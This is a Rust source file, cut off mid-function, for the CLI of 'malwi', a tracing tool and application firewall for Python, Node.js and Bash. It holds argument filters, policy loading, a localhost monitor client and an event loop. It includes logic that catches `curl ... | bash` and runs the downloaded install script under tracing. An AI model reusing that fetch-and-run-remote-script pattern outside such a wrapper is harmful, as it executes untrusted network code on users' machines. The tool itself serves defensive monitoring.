//! Malwi-trace CLI - function tracing tool.

mod agent_server;
mod auto_policy;
mod command_analysis;
mod config;
mod default_policy;
mod monitor;
mod native_spawn;
mod policy_bridge;
mod shell_format;
mod spawn;
mod symbol_resolver;

use std::collections::{HashMap, HashSet};
use std::io::Write;
use std::path::PathBuf;
use std::sync::atomic::{AtomicU32, Ordering};
use std::sync::mpsc::{self, Receiver};
use std::sync::Arc;
use std::thread;

use anyhow::Result;
use clap::{Parser, Subcommand};
use log::{debug, warn};
use malwi_protocol::glob::{matches_glob, matches_glob_ci};
use malwi_protocol::{HookConfig, HookType, ReviewDecision, RuntimeStack, TraceEvent};

use std::path::Path;

use agent_server::{AgentEvent, AgentServer};

const BANNER: &str = "                    __          __\n    .--------.---.-|  .--.--.--|__|\n    |        |  _  |  |  |  |  |  |\n    |__|__|__|___._|__|________|__|\n\n  Your in-process application firewall\n  for Python, Node.js and Bash.\n  ____________________________________";

#[derive(Parser)]
#[command(name = "malwi")]
#[command(version, about = "", long_about = None)]
#[command(before_help = BANNER)]
struct Cli {
    /// Enable verbose logging
    #[arg(short, long)]
    verbose: bool,

    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    #[command(
        about = "Execute, trace and protect a program",
        before_help = BANNER,
        help_template = "{before-help}\n{usage-heading} {usage}\n\n{all-args}",
    )]
    X {
        /// Native symbols to trace
        #[arg(
            short = 's',
            long = "symbol",
            value_name = "PATTERN",
            help_heading = "Tracing"
        )]
        symbols: Vec<String>,

        /// Child process commands to trace
        #[arg(
            short = 'c',
            long = "command",
            value_name = "PATTERN",
            help_heading = "Tracing"
        )]
        exec: Vec<String>,

        /// Python functions to trace
        #[arg(
            long = "py",
            visible_alias = "python",
            value_name = "PATTERN",
            help_heading = "Tracing"
        )]
        python: Vec<String>,

        /// Node.js functions to trace
        #[arg(
            long = "js",
            visible_alias = "javascript",
            value_name = "PATTERN",
            help_heading = "Tracing"
        )]
        javascript: Vec<String>,

        /// Policy YAML file [default: ~/.config/malwi/policies/default.yaml]
        #[arg(
            short = 'p',
            long = "policy",
            value_name = "FILE",
            help_heading = "Policy"
        )]
        policy: Option<PathBuf>,

        /// Enable review mode (prompt on each call with Y/n/i options)
        #[arg(short, long, help_heading = "Policy")]
        review: bool,

        /// Capture stack traces for each function call
        #[arg(long = "st", visible_alias = "stack-trace", help_heading = "Output")]
        stack_trace: bool,

        /// Output file (default: stdout)
        #[arg(short, long, help_heading = "Output")]
        output: Option<PathBuf>,

        /// Send output to monitor instead of displaying locally
        #[arg(short, long, help_heading = "Output")]
        monitor: bool,

        /// Monitor port
        #[arg(long, default_value = "9123", help_heading = "Output")]
        monitor_port: u16,

        /// Execute, trace and protect a program
        #[arg(trailing_var_arg = true, required = true)]
        program: Vec<String>,
    },

    /// Monitor events from malwi x in a separate terminal
    #[command(before_help = BANNER)]
    M {
        /// Port to listen on
        #[arg(short, long, default_value = "9123")]
        port: u16,

        /// Show stack traces
        #[arg(short = 't', long)]
        stack_trace: bool,
    },

    /// List or manage policy files
    #[command(before_help = BANNER)]
    P {
        /// Policy name to write, or "reset" to rewrite all
        name: Option<String>,
    },
}

fn main() -> Result<()> {
    let cli = Cli::parse();

    // Initialize logging
    let log_level = if cli.verbose { "debug" } else { "info" };
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or(log_level)).init();

    match cli.command {
        Commands::X {
            symbols,
            python,
            javascript,
            exec,
            policy,
            review,
            stack_trace,
            output,
            monitor,
            monitor_port,
            program,
        } => {
            let trace_config = TraceConfig {
                symbols,
                python,
                javascript,
                exec,
                policy_file: policy,
                review,
                stack_trace,
                output,
                use_monitor: monitor,
                monitor_port,
            };
            spawn_and_trace(trace_config, program)?;
        }
        Commands::M { port, stack_trace } => {
            monitor::run_monitor(port, stack_trace)?;
        }
        Commands::P { name } => match name.as_deref() {
            None => config::list_policies()?,
            Some("reset") => config::reset_policies()?,
            Some(name) => config::write_policy(name)?,
        },
    }

    Ok(())
}

// =============================================================================
// ARGUMENT FILTERING
// =============================================================================

/// Parse a call spec that may contain bracket-delimited argument filter.
/// E.g., `connect[*:443]` → `("connect", Some("*:443"))`
/// E.g., `connect` → `("connect", None)`
fn parse_call_spec(spec: &str) -> (&str, Option<&str>) {
    if let Some(pos) = spec.rfind('[') {
        if spec.ends_with(']') && pos + 1 < spec.len() - 1 {
            return (&spec[..pos], Some(&spec[pos + 1..spec.len() - 1]));
        }
    }
    (spec, None)
}

/// A filter pattern with optional inversion and OR support.
/// Supports `|` to combine multiple patterns: `*:443|*:80` matches either.
/// With inversion: `!*pypi.org*|*npmjs.org*` excludes both.
#[derive(Debug, Clone)]
struct FilterPattern {
    patterns: Vec<String>,
    inverted: bool,
}

impl FilterPattern {
    fn new(bracket_content: &str) -> Self {
        let (content, inverted) = if let Some(rest) = bracket_content.strip_prefix('!') {
            (rest, true)
        } else {
            (bracket_content, false)
        };
        let patterns: Vec<String> = content.split('|').map(|s| s.to_string()).collect();
        FilterPattern { patterns, inverted }
    }

    /// Check if text matches this filter pattern, respecting inversion.
    /// Uses case-insensitive matching (important for DNS hostnames).
    fn matches(&self, text: &str) -> bool {
        let any_match = self.patterns.iter().any(|p| matches_glob_ci(p, text));
        if self.inverted {
            !any_match
        } else {
            any_match
        }
    }
}

/// Argument-based display filter for trace events.
/// The agent sends all events; the CLI filters what to display.
struct ArgFilter {
    /// Per-function argument filters. Key is the bare function name (e.g., "connect", "open", "curl").
    /// Glob keys are supported (e.g., "fs.*").
    per_function: HashMap<String, FilterPattern>,
}

impl ArgFilter {
    fn new() -> Self {
        ArgFilter {
            per_function: HashMap::new(),
        }
    }

    /// Find the filter pattern for a function name.
    /// First tries exact match, then glob-matches keys against the function name.
    fn find_filter_pattern(&self, function: &str) -> Option<&FilterPattern> {
        // Exact match first
        if let Some(fp) = self.per_function.get(function) {
            return Some(fp);
        }
        // Try glob-matching keys (e.g., key "fs.*" matches function "fs.readFileSync")
        for (key, fp) in &self.per_function {
            if matches_glob(key, function) {
                return Some(fp);
            }
        }
        None
    }

    /// Check if a trace event should be displayed.
    fn should_display_trace(&self, event: &TraceEvent) -> bool {
        let args_text = event
            .arguments
            .iter()
            .filter_map(|a| a.display.as_ref())
            .cloned()
            .collect::<Vec<_>>()
            .join(", ");

        // Check per-function filter
        if let Some(fp) = self.find_filter_pattern(&event.function) {
            if !fp.matches(&args_text) {
                return false;
            }
        }

        true
    }
}

/// Build hook configs and associated metadata from a list of specs for a given hook type.
/// Returns a list of (HookConfig, function_key, optional_bracket_content) tuples.
fn build_hooks(
    specs: &[String],
    hook_type: HookType,
    capture_stack: bool,
    arg_count: Option<usize>,
    capture_return: bool,
) -> Vec<(HookConfig, String, Option<String>)> {
    specs
        .iter()
        .map(|spec| {
            let (sym, bracket_content) = parse_call_spec(spec);
            let config = HookConfig {
                hook_type: hook_type.clone(),
                symbol: sym.to_string(),
                arg_count,
                capture_return,
                capture_stack,
            };
            let key = sym.to_string();
            (config, key, bracket_content.map(|s| s.to_string()))
        })
        .collect()
}

// =============================================================================
// MONITOR CLIENT
// =============================================================================

/// HTTP client for sending events to a monitor server.
/// Uses raw TcpStream for minimal dependencies (localhost-only).
struct MonitorClient {
    addr: String,
    session_id: String,
}

impl MonitorClient {
    /// Create a new monitor client and verify the monitor is running.
    fn new(port: u16) -> Result<Self> {
        let addr = format!("127.0.0.1:{}", port);
        let session_id = format!(
            "{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_nanos()
        );

        // Check if monitor is running
        match monitor_http_get(&addr, "/health") {
            Ok(_) => Ok(Self { addr, session_id }),
            Err(_) => anyhow::bail!(
                "No monitor at http://{}. Start with 'malwi m' in another terminal.",
                addr
            ),
        }
    }

    /// Notify monitor of session start.
    fn start_session(&self, command: &[String], pid: u32) -> Result<()> {
        let req = monitor::SessionStartRequest {
            session_id: self.session_id.clone(),
            command: command.to_vec(),
            pid,
        };
        self.post("/session/start", &req)
    }

    /// Send a trace event to the monitor.
    fn send_event(&self, event: &TraceEvent) -> Result<()> {
        let req = monitor::EventRequest {
            session_id: self.session_id.clone(),
            event: event.clone(),
        };
        self.post("/event", &req)
    }

    /// Notify monitor of session end.
    fn end_session(&self, exit_code: Option<i32>) -> Result<()> {
        let req = monitor::SessionEndRequest {
            session_id: self.session_id.clone(),
            exit_code,
        };
        self.post("/session/end", &req)
    }

    /// POST JSON to the monitor.
    fn post<T: serde::Serialize>(&self, path: &str, body: &T) -> Result<()> {
        let json = serde_json::to_string(body)?;
        match monitor_http_post(&self.addr, path, &json) {
            Ok(_) => Ok(()),
            Err(e) => {
                warn!("Failed to send to monitor: {}", e);
                Ok(())
            }
        }
    }
}

/// Raw HTTP POST to a localhost address. Returns the response body.
fn monitor_http_post(addr: &str, path: &str, body: &str) -> Result<String> {
    use std::io::{Read, Write as IoWrite};
    use std::net::TcpStream;

    let mut stream = TcpStream::connect(addr)?;
    stream.set_read_timeout(Some(std::time::Duration::from_secs(5)))?;
    stream.set_write_timeout(Some(std::time::Duration::from_secs(5)))?;

    let request = format!(
        "POST {} HTTP/1.1\r\nHost: {}\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
        path, addr, body.len(), body
    );
    stream.write_all(request.as_bytes())?;

    let mut response = String::new();
    stream.read_to_string(&mut response)?;

    // Parse status line
    let status_line = response.lines().next().unwrap_or("");
    if !status_line.contains("200") {
        anyhow::bail!("HTTP error: {}", status_line);
    }

    // Extract body after \r\n\r\n
    Ok(response.split("\r\n\r\n").nth(1).unwrap_or("").to_string())
}

/// Raw HTTP GET to a localhost address. Returns the response body.
fn monitor_http_get(addr: &str, path: &str) -> Result<String> {
    use std::io::{Read, Write as IoWrite};
    use std::net::TcpStream;

    let mut stream = TcpStream::connect(addr)?;
    stream.set_read_timeout(Some(std::time::Duration::from_secs(2)))?;
    stream.set_write_timeout(Some(std::time::Duration::from_secs(2)))?;

    let request = format!(
        "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
        path, addr
    );
    stream.write_all(request.as_bytes())?;

    let mut response = String::new();
    stream.read_to_string(&mut response)?;

    let status_line = response.lines().next().unwrap_or("");
    if !status_line.contains("200") {
        anyhow::bail!("HTTP error: {}", status_line);
    }

    Ok(response.split("\r\n\r\n").nth(1).unwrap_or("").to_string())
}

/// Configuration for the `spawn_and_trace` entry point.
struct TraceConfig {
    symbols: Vec<String>,
    python: Vec<String>,
    javascript: Vec<String>,
    exec: Vec<String>,
    policy_file: Option<PathBuf>,
    review: bool,
    stack_trace: bool,
    output: Option<PathBuf>,
    use_monitor: bool,
    monitor_port: u16,
}

/// Detect `malwi x curl ... | bash` and transform to `malwi x -- bash <tempfile>`.
///
/// When stdout is a pipe (the user is piping malwi's output to bash) and the
/// program is curl/wget writing to stdout, we:
/// 1. Download the script natively (untraced)
/// 2. Reopen stdout to /dev/tty so traced bash output goes to the terminal
/// 3. Replace the program with `["bash", tempfile]`
///
/// Returns `(program, Option<tempfile_path>)`.
fn maybe_transform_piped_download(program: Vec<String>) -> (Vec<String>, Option<PathBuf>) {
    if program.is_empty() {
        return (program, None);
    }

    let basename = Path::new(&program[0])
        .file_name()
        .and_then(|f| f.to_str())
        .unwrap_or(&program[0]);

    let is_curl = basename == "curl";
    let is_wget = basename == "wget";
    if !is_curl && !is_wget {
        return (program, None);
    }

    // Check if stdout is a pipe (not a terminal)
    let stdout_is_pipe = unsafe { libc::isatty(libc::STDOUT_FILENO) == 0 };
    if !stdout_is_pipe {
        return (program, None);
    }

    // For curl: must NOT have -o/--output (meaning it writes to stdout)
    // For wget: must have -O-/--output-document=- (explicit stdout)
    if is_curl {
        let has_output_flag = program[1..].iter().any(|arg| {
            arg == "-o"
                || arg == "--output"
                || arg.starts_with("-o")
                || arg.starts_with("--output=")
        });
        if has_output_flag {
            return (program, None);
        }
    } else {
        // wget: needs explicit -O - or --output-document=-
        let has_stdout_flag = program[1..]
            .windows(2)
            .any(|w| (w[0] == "-O" && w[1] == "-") || w[0] == "-O-")
            || program[1..]
                .iter()
                .any(|arg| arg == "-O-" || arg == "--output-document=-");
        if !has_stdout_flag {
            return (program, None);
        }
    }

    // Run the download command natively
    eprintln!("[malwi] Downloading install script...");
    let output = match std::process::Command::new(&program[0])
        .args(&program[1..])
        .output()
    {
        Ok(o) => o,
        Err(e) => {
            debug!("Failed to run download command: {}", e);
            return (program, None);
        }
    };

    if !output.status.success() {
        debug!("Download command failed with status: {}", output.status);
        return (program, None);
    }

    if output.stdout.is_empty() {
        debug!("Download produced no output");
        return (program, None);
    }

    // Write to temp file
    let pid = std::process::id();
    let temp_path = PathBuf::from(format!("/tmp/malwi-script-{}.sh", pid));
    if let Err(e) = std::fs::write(&temp_path, &output.stdout) {
        debug!("Failed to write temp script: {}", e);
        return (program, None);
    }

    // Redirect stdout to /dev/tty so traced bash output goes to terminal
    unsafe {
        let tty = std::ffi::CString::new("/dev/tty").unwrap();
        let fd = libc::open(tty.as_ptr(), libc::O_WRONLY);
        if fd >= 0 {
            libc::dup2(fd, libc::STDOUT_FILENO);
            libc::close(fd);
        }
    }

    eprintln!("[malwi] Downloaded install script, tracing bash execution...");
    let new_program = vec!["bash".to_string(), temp_path.to_string_lossy().to_string()];
    (new_program, Some(temp_path))
}

fn spawn_and_trace(config: TraceConfig, program: Vec<String>) -> Result<()> {
    if program.is_empty() {
        anyhow::bail!("No program specified");
    }

    // Transform `malwi x curl ... | bash` → `malwi x -- bash <tempfile>`
    let (program, temp_script) = maybe_transform_piped_download(program);

    debug!("Spawning: {:?}", program);

    let has_manual_hooks = !config.symbols.is_empty()
        || !config.python.is_empty()
        || !config.javascript.is_empty()
        || !config.exec.is_empty();

    // Load policy (if applicable)
    let active_policy: Option<policy_bridge::ActivePolicy> =
        if let Some(ref path) = config.policy_file {
            // Explicit --policy flag: try as named policy first, then as file path.
            let path_str = path.to_string_lossy();
            let p = if !path.exists() {
                if let Some(yaml) = auto_policy::embedded_policy(&path_str) {
                    policy_bridge::ActivePolicy::from_yaml(&yaml).map_err(|e| {
                        anyhow::anyhow!("Failed to parse named policy '{}': {}", path_str, e)
                    })?
                } else {
                    policy_bridge::ActivePolicy::from_file(&path_str)?
                }
            } else {
                policy_bridge::ActivePolicy::from_file(&path_str)?
            };
            Some(p)
        } else if has_manual_hooks {
            // Manual hooks given → no policy
            None
        } else if let Some(policy_name) = auto_policy::detect_policy(&program) {
            // Auto-detected command-specific policy
            let path = auto_policy::ensure_auto_policy(policy_name)?;
            eprintln!("Using policy: {} ({})", policy_name, path.display());
            Some(policy_bridge::ActivePolicy::from_file(
                &path.to_string_lossy(),
            )?)
        } else {
            // Default policy from config file
            let config_path = self::config::default_policy_path()?;
            self::config::ensure_default_policy(&config_path)?;
            Some(policy_bridge::ActivePolicy::from_file(
                &config_path.to_string_lossy(),
            )?)
        };

    // Build hook configs from policy + manual specs
    let mut hook_configs: Vec<HookConfig> = Vec::new();

    // Derive hooks from policy
    if let Some(ref policy) = active_policy {
        let policy_hooks = policy.derive_hook_configs(config.stack_trace);
        hook_configs.extend(policy_hooks);
    }

    // Build argument filter and collect hook configs from per-type flags
    let mut arg_filter = ArgFilter::new();
    let mut unfiltered_functions: HashSet<String> = HashSet::new();

    // Track which functions come from manual flags (bypass policy evaluation)
    let mut manual_functions: HashSet<String> = HashSet::new();

    // Build hooks for each type
    let all_hooks = [
        build_hooks(
            &config.symbols,
            HookType::Native,
            config.stack_trace,
            Some(6),
            true,
        ),
        build_hooks(
            &config.python,
            HookType::Python,
            config.stack_trace,
            None,
            true,
        ),
        build_hooks(
            &config.javascript,
            HookType::Nodejs,
            config.stack_trace,
            None,
            true,
        ),
        build_hooks(
            &config.exec,
            HookType::Exec,
            config.stack_trace,
            None,
            false,
        ),
    ];

    for hooks in &all_hooks {
        for (config, key, bracket_content) in hooks {
            hook_configs.push(config.clone());
            manual_functions.insert(key.clone());

            if let Some(content) = bracket_content {
                let fp = FilterPattern::new(content);
                if !unfiltered_functions.contains(key) {
                    arg_filter.per_function.insert(key.clone(), fp);
                }
            } else {
                unfiltered_functions.insert(key.clone());
                arg_filter.per_function.remove(key);
            }
        }
    }

    // Deduplicate hook configs by (hook_type, symbol)
    {
        let mut seen = HashSet::new();
        hook_configs.retain(|c| {
            let key = (format!("{:?}", c.hook_type), c.symbol.clone());
            seen.insert(key)
        });
    }

    // Bash builtins (echo/cd/export/eval/source) are not native syscalls and
    // may not be reachable through our low-level hooks on all platforms.
    // When tracing commands in bash, enable xtrace and direct its output to
    // stdout, so builtins show up as `[malwi] ...` lines.
    //
    // Also provide a best-effort policy enforcement fallback for `eval` and
    // `source` by shadowing those builtins when policy blocks them.
    let mut temp_bash_env: Option<PathBuf> = None;
    {
        let is_bash = Path::new(&program[0])
            .file_name()
            .and_then(|s| s.to_str())
            .map(|n| n.starts_with("bash"))
            .unwrap_or(false);

        // Only enable xtrace when the user explicitly requested command tracing
        // via `-c/--command`. (Policy-derived Exec hooks shouldn't change bash's
        // stdout, as it can break other policy tests and pipelines.)
        let enable_xtrace = !config.exec.is_empty();

        // If policy blocks eval/source, shadow those builtins in bash even if
        // command tracing wasn't requested.
        let mut block_eval = false;
        let mut block_source = false;
        if let Some(ref policy) = active_policy {
            use malwi_protocol::{Argument, EventType, HookType as EvHookType, TraceEvent};

            let eval_event = TraceEvent {
                hook_type: EvHookType::Exec,
                event_type: EventType::Enter,
                function: "eval".to_string(),
                arguments: Vec::<Argument>::new(),
                native_stack: Vec::new(),
                runtime_stack: None,
                network_info: None,
                source_file: None,
                source_line: None,
            };
            let source_event = TraceEvent {
                hook_type: EvHookType::Exec,
                event_type: EventType::Enter,
                function: "source".to_string(),
                arguments: Vec::<Argument>::new(),
                native_stack: Vec::new(),
                runtime_stack: None,
                network_info: None,
                source_file: None,
                source_line: None,
            };

            block_eval = policy.evaluate_trace(&eval_event).is_blocked();
            block_source = policy.evaluate_trace(&source_event).is_blocked();
        }

        let need_bash_env = is_bash && (enable_xtrace || block_eval || block_source);
        if need_bash_env {
            let pid = std::process::id();
            let env_path = PathBuf::from(format!("/tmp/malwi-bash-env-{}.sh", pid));

            let mut script = String::new();
            if enable_xtrace {
                // Ensure xtrace output always goes to the original stdout, even
                // when running pipelines where fd 1 may be redirected to a pipe.
                script.push_str("exec 9>&1\n");
                script.push_str("export BASH_XTRACEFD=9\n");
                script.push_str("export PS4='[malwi] '\n");
                script.push_str("set -x\n");
            }
            if block_eval {
                script.push_str("eval() { echo 'denied: eval'; exit 126; }\n");
            }
            if block_source {
                script.push_str("source() { echo 'denied: source'; exit 126; }\n");
            }

            if std::fs::write(&env_path, script).is_ok() {
                std::env::set_var("BASH_ENV", &env_path);
                temp_bash_env = Some(env_path);
            }
        }
    }

    // Determine if review mode should be auto-enabled by policy
    let effective_review = config.review
        || active_policy
            .as_ref()
            .is_some_and(|p| p.has_blocking_sections());

    // Bounded channel for events from HTTP server threads to main loop.
    // Bounded channel provides backpressure: when the main thread can't keep up
    // (e.g., stdout pipe is full), server threads block on send, which delays
    // the HTTP response, which naturally throttles the agent.
    let (event_tx, event_rx) = mpsc::sync_channel::<AgentEvent>(1024);

    // Track active agent connections (shared between server and main loop)
    let active_agents = Arc::new(AtomicU32::new(0));

    // Create HTTP server for agent communication
    let requested_hooks = hook_configs.clone();
    let server = AgentServer::new(
        hook_configs,
        effective_review,
        event_tx,
        active_agents.clone(),
    )?;

    let server_url = server.url().to_string();
    debug!("Agent server listening on {}", server_url);

    // Spawn the target process with the agent injected
    let needs_js = requested_hooks
        .iter()
        .any(|h| h.hook_type == HookType::Nodejs);

    #[cfg(any(target_os = "macos", target_os = "linux"))]
    let root_pid = spawn::spawn_with_injection(&program[0], &program[1..], &server_url, needs_js)?;

    #[cfg(not(any(target_os = "macos", target_os = "linux")))]
    anyhow::bail!("Process spawning with agent injection is only supported on macOS and Linux");

    debug!("Spawned process with PID {}", root_pid);

    // Run HTTP server in background thread
    let server_handle = thread::Builder::new()
        .name("agent-server".to_string())
        .spawn(move || server.run())
        .expect("Failed to spawn agent server thread");

    // Create monitor client if --monitor flag was passed
    let monitor_client = if config.use_monitor {
        Some(MonitorClient::new(config.monitor_port)?)
    } else {
        None
    };

    // Notify monitor of session start
    if let Some(ref client) = monitor_client {
        client.start_session(&program, root_pid as u32)?;
    }

    // Build event loop config and state
    let loop_config = EventLoopConfig {
        root_pid,
        stack_trace_enabled: config.stack_trace,
        arg_filter: &arg_filter,
        monitor_client: monitor_client.as_ref(),
        active_policy: active_policy.as_ref(),
        manual_functions: &manual_functions,
        requested_hooks: &requested_hooks,
    };

    use std::io::BufWriter;
    let output_writer: Option<Box<dyn Write>> = if monitor_client.is_none() {
        Some(if let Some(path) = config.output {
            Box::new(BufWriter::new(std::fs::File::create(path)?))
        } else {
            Box::new(std::io::stdout())
        })
    } else {
        None
    };

    let mut loop_state = EventLoopState {
        output_writer,
        seen_root: false,
        all_pids: HashMap::new(),
        root_dead_since: None,
        symbol_resolver: symbol_resolver::SymbolResolver::new(),
    };

    // Main event loop - process events and print output
    let exit_code = run_main_event_loop(
        event_rx,
        &active_agents,
        &server_handle,
        &loop_config,
        &mut loop_state,
    )?;

    // Notify monitor of session end
    if let Some(ref client) = monitor_client {
        let _ = client.end_session(exit_code);
    }

    // Clean up temp script from piped download transform
    if let Some(path) = temp_script {
        let _ = std::fs::remove_file(path);
    }
    if let Some(path) = temp_bash_env {
        let _ = std::fs::remove_file(path);
    }

    Ok(())
}

/// Immutable configuration for the event loop.
struct EventLoopConfig<'a> {
    root_pid: i32,
    stack_trace_enabled: bool,
    arg_filter: &'a ArgFilter,
    monitor_client: Option<&'a MonitorClient>,
    active_policy: Option<&'a policy_bridge::ActivePolicy>,
    manual_functions: &'a HashSet<String>,
    requested_hooks: &'a [HookConfig],
}

/// Mutable state owned by the event loop.
struct EventLoopState {
    output_writer: Option<Box<dyn Write>>,
    seen_root: bool,
    all_pids: HashMap<u32, bool>,
    root_dead_since: Option<std::time::Instant>,
    symbol_resolver: symbol_resolver::SymbolResolver,
}

/// Check if a process is still running using waitpid with WNOHANG.
/// Returns true if still running, false if exited.
#[cfg(unix)]
fn is_process_alive(pid: i32) -> bool {
    let mut status: libc::c_int = 0;
    let result = unsafe { libc::waitpid(pid, &mut status, libc::WNOHANG) };
    // waitpid returns:
    // - 0 if child is still running
    // - pid if child exited
    // - -1 on error (e.g., not our child)
    result == 0
}

#[cfg(not(unix))]
fn is_process_alive(_pid: i32) -> bool {
    true // Assume alive on non-Unix platforms
}

/// Main event loop - receives events from all agents and prints them.
/// Returns the exit code of the root process if available.
fn run_main_event_loop(
    event_rx: Receiver<AgentEvent>,
    active_agents: &AtomicU32,
    server_handle: &thread::JoinHandle<()>,
    config: &EventLoopConfig,
    state: &mut EventLoopState,
) -> Result<Option<i32>> {
    loop {
        // Wait for events
        match event_rx.recv_timeout(std::time::Duration::from_secs(1)) {
            Ok(event) => {
                let is_disconnect = matches!(&event, AgentEvent::Disconnected { .. });
                process_event(event, config, state)?;
                // Decrement active_agents here (not in the HTTP handler) so that
                // all preceding events in the FIFO channel are guaranteed to have
                // been processed first. This eliminates the shutdown drain race.
                if is_disconnect {
                    active_agents.fetch_sub(1, Ordering::SeqCst);
                    if state.seen_root && active_agents.load(Ordering::SeqCst) == 0 {
                        break;
                    }
                }
            }
            Err(mpsc::RecvTimeoutError::Timeout) => {
                // Check if server thread panicked
                if server_handle.is_finished() {
                    debug!("Server thread exited unexpectedly");
                    break;
                }
                // Check if all agents disconnected
                if active_agents.load(Ordering::SeqCst) == 0 && state.seen_root {
                    break;
                }
                // Check if root process exited without ever connecting
                // This handles cases like non-existent programs or immediate crashes
                if !state.seen_root && !is_process_alive(config.root_pid) {
                    debug!(
                        "Root process {} exited before agent connected",
                        config.root_pid
                    );
                    anyhow::bail!("Target process exited before agent could connect (program may not exist or crashed immediately)");
                }
                // Fallback: if root process has exited but some agents haven't
                // sent /shutdown (e.g., forked children that died without cleanup),
                // wait up to 2 seconds then exit gracefully.
                if state.seen_root && !is_process_alive(config.root_pid) {
                    match state.root_dead_since {
                        None => {
                            state.root_dead_since = Some(std::time::Instant::now());
                        }
                        Some(since) if since.elapsed() > std::time::Duration::from_secs(2) => {
                            debug!(
                                "Root process exited but {} agents still active, exiting after timeout",
                                active_agents.load(Ordering::SeqCst)
                            );
                            break;
                        }
                        _ => {}
                    }
                }
            }
            Err(mpsc::RecvTimeoutError::Disconnected) => {
                break;
            }
        }
    }

    // Get exit code via waitpid
    #[cfg(unix)]
    {
        let mut status: libc::c_int = 0;
        let result = unsafe { libc::waitpid(config.root_pid, &mut status, 0) };
        if result > 0 && libc::WIFEXITED(status) {
            return Ok(Some(libc::WEXITSTATUS(status)));
        }
    }

    Ok(None)
}

/// Check if a function was specified via manual flags (bypasses policy evaluation).
/// Checks exact match first, then glob-matches against manual function patterns.
fn is_manual_function(function: &str, manual_functions: &HashSet<String>) -> bool {
    if manual_functions.is_empty() {
        return false;
    }
    // Exact match
    if manual_functions.contains(function) {
        return true;
    }
    // Glob match (e.g., manual spec "fs.*" should match "fs.readFileSync")
    for pattern in manual_functions {
        if matches_glob(pattern, function) {
            return true;
        }
    }
    false
}

fn process_event(
    event: AgentEvent,
    config: &EventLoopConfig,
    state: &mut EventLoopState,
) -> Result<()> {
    match event {
        AgentEvent::Ready {
            pid,
            hooks,
            nodejs_version,
            python_version,
            bash_version,
            modules,
        } => {
            if let Some(v) = nodejs_version {
                debug!("Node.js {} detected, addon loaded", v);
            }
            debug!(
                "Agent ready (PID {}): {} hooks installed, {} modules",
                pid,
                hooks.len(),
                modules.len()
            );
            for hook in &hooks {
                debug!("  - {}", hook);
            }
            if !modules.is_empty() {
                state.symbol_resolver.add_module_map(pid, modules);
            }
            state.all_pids.insert(pid, true);
            if pid == config.root_pid as u32 {
                state.seen_root = true;

                // Print each detected runtime immediately.
                // Node.js version typically arrives later via RuntimeInfo.
                if let Some(ref pyv) = python_version {
                    eprintln!("{}[malwi] Detected Python {}{}", DIM, pyv, RESET);
                }
                if let Some(v) = nodejs_version {
                    eprintln!("{}[malwi] Detected Node.js v{}{}", DIM, v, RESET);
                }
                if let Some(ref bv) = bash_version {
                    eprintln!("{}[malwi] Detected Bash {}{}", DIM, bv, RESET);
                }

                // Check which native hooks failed to install and report errors.
                // Only check Native hooks — Python/JS/Exec hooks are installed by
                // the runtime-specific subsystems and aren't reported in the
                // agent's hook list.
                for hc in config.requested_hooks {
                    if hc.hook_type == malwi_protocol::HookType::Native
                        && !hooks
                            .iter()
                            .any(|h| h == &hc.symbol || matches_glob(&hc.symbol, h))
                    {
                        eprintln!("Error: Symbol not found: {}", hc.symbol);
                    }
                }
            }
        }
        AgentEvent::RuntimeInfo { runtime, version } => {
            // Late-arriving runtime info (e.g., Node.js version after main() runs).
            // Print immediately as a separate line.
            let name = display_runtime_name(&runtime);
            eprintln!("{}[malwi] Detected {} {}{}", DIM, name, version, RESET);
        }
        AgentEvent::Trace(trace_event) => {
            let is_manual = is_manual_function(&trace_event.function, config.manual_functions);

            // For manual -c functions: use ArgFilter as before
            if is_manual {
                if !config.arg_filter.should_display_trace(&trace_event) {
                    return Ok(());
                }
            } else if let Some(policy) = config.active_policy {
                // For policy-driven events: evaluate against policy
                let disp = policy.evaluate_trace(&trace_event);
                match disp {
                    policy_bridge::EventDisposition::Suppress => return Ok(()),
                    policy_bridge::EventDisposition::Block { rule, section } => {
                        emit_blocked(
                            &trace_event,
                            &rule,
                            &section,
                            config.monitor_client,
                            state.output_writer.as_deref_mut(),
                        );
                        return Ok(());
                    }
                    policy_bridge::EventDisposition::Warn {
                        rule: _,
                        section: _,
                    } => {
                        emit_warning(
                            &trace_event,
                            config.monitor_client,
                            state.output_writer.as_deref_mut(),
                        );
                        // For exec events, the warning line already contains the full command.
                        // For function calls, fall through to also print the call details.
                        if trace_event.hook_type == HookType::Exec {
                            return Ok(());
                        }
                    }
                    policy_bridge::EventDisposition::Display
                    | policy_bridge::EventDisposition::Review { .. } => {
                        // Show the event normally
                    }
                }
            } else {
                // No policy, no manual match — show everything (shouldn't happen normally)
                if !config.arg_filter.should_display_trace(&trace_event) {
                    return Ok(());
                }
            }

            // Resolve native stack symbols before display
            let resolved_frames = if !trace_event.native_stack.is_empty() {
                state
                    .symbol_resolver
                    .resolve_addresses(&trace_event.native_stack)
            } else {
                vec![]
            };

            // Send to monitor if available, otherwise print locally
            if let Some(client) = config.monitor_client {
                let _ = client.send_event(&trace_event);
            } else if let Some(ref mut out) = state.output_writer {
                print_trace_event(
                    &trace_event,
                    &resolved_frames,
                    out,
                    config.stack_trace_enabled,
                )?;
            }
        }
        AgentEvent::Disconnected { pid } => {
            debug!("Agent {} disconnected", pid);
            state.all_pids.remove(&pid);
            state.symbol_resolver.remove_pid(pid);
        }
        AgentEvent::ReviewRequest { event, response_tx } => {
            let decision = if !is_manual_function(&event.function, config.manual_functions) {
                if let Some(pol) = config.active_policy {
                    match pol.evaluate_trace(&event) {
                        policy_bridge::EventDisposition::Block { rule, section } => {
                            emit_blocked(
                                &event,
                                &rule,
                                &section,
                                config.monitor_client,
                                state.output_writer.as_deref_mut(),
                            );
                            ReviewDecision::Block
                        }
                        policy_bridge::EventDisposition::Suppress => ReviewDecision::Suppress,
                        policy_bridge::EventDisposition::Warn { .. } => {
                            emit_warning(
                                &event,
                                config.monitor_client,
                                state.output_writer.as_deref_mut(),
                            );
                            ReviewDecision::Warn
                        }
                        policy_bridge::EventDisposition::Display => ReviewDecision::Allow,
                        policy_bridge::EventDisposition::Review { .. } => {
